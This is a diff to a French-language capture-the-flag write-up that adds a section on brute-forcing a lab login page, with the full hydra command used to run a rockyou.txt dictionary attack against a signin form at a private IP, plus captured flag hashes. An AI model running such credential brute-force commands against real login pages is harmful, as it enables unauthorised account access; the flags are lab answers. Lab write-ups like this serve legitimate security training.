@@ -75,4 +75,10 @@ a force de tenter des truc la page feedback lancais trop de script j'ai donc red
 flag:
 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E -->
 
-## GVVGGGV
+## Brut-force login page
+
+Apres de multiple tentative de brut-force en utilisant des combnaison de liste pour le login et e password j'ai remarquer que l'image sur la page de login etais marvin qui pointe sur le champs username du form j'ai donc tenter une ataque par dictionaire en gardant le username `marvin`
+
+`hydra -l marvin -P /home/ar_ruc/Téléchargements/rockyou.txt 10.13.200.24 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login#:images/WrongAnswer.gif"`
+
+flag:B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
